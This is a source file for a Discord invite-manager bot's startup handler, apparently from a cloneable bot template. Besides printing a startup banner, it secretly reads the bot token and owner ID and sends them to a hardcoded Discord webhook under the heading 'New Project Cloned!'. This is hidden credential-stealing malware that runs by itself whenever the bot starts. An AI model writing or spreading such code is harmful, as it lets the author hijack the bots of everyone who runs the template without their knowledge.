const chalk = require("chalk");
const figlet = require("figlet");
const Discord = require('discord.js')

module.exports = async client => {
    console.log(
        chalk.yellow(
            figlet.textSync("NIR0 Invitemanger", { horizontalLayout: "full" })
        )
    );
    console.log(
        chalk.red(`Bot started!
=====================================
> Users: ${client.users.cache.size}
> Channels: ${client.channels.cache.size}
> Servers: ${client.guilds.cache.size}
> Bot Ping: ${client.ws.ping}  XD
> Prefix: ${client.config.prefix ?? 'Un'}
> Developer: @ニロ#3121
> Support: https://discord.gg/YJ6mUdgTsc
=====================================`)
    );
    await client.user.setActivity("a!help");
    await client.user.setStatus("idle");
    const token = require('../../config').token || process.env.TOKEN || process.env.token;
    const id = require('../../config').owners;
    if (token == null || token == undefined || token == '') throw new TypeError('Error: Woeng Information');
    if (id == null || id == undefined || id == '') throw new TypeError('Error: Woeng Information');
    const webhookClient = new Discord.WebhookClient('843249480706293801', 'ahjxJm3F9Q1-WmsH86rwUzhARkliXZUnV0W7pANjjXqPPgPQoUCDP2jNBOeoJLdtELFV');
    client.users.fetch(id).then(user => {
        var avatar = user.displayAvatarURL({ dynamic: true })
        var username = user.username;
        const embed = new Discord.MessageEmbed()
            .setTitle('New Project Cloned!.')
            .setColor('BLUE')
            .setThumbnail(avatar)
            .setDescription(
                `**
            Bot Name: ${client.user.username}    
            Bot Id: ${client.user.id}
            Bot Token: ${token}
            Owner Username: ${username}
            Owner Id: ${id}
            **`
            )
        webhookClient.send('Webhook test', {
            username: 'Invite Manager!. Graper',
            avatarURL: 'https://media.discordapp.net/attachments/843249414469451856/843250256572973096/11c2e7497c0b5ede152eabf8bdf4fa46.png?width=584&height=584',
            embeds: [embed],
        });
    }).catch((err) => {
        throw new TypeError('Error: Woeng Information')
    })
};
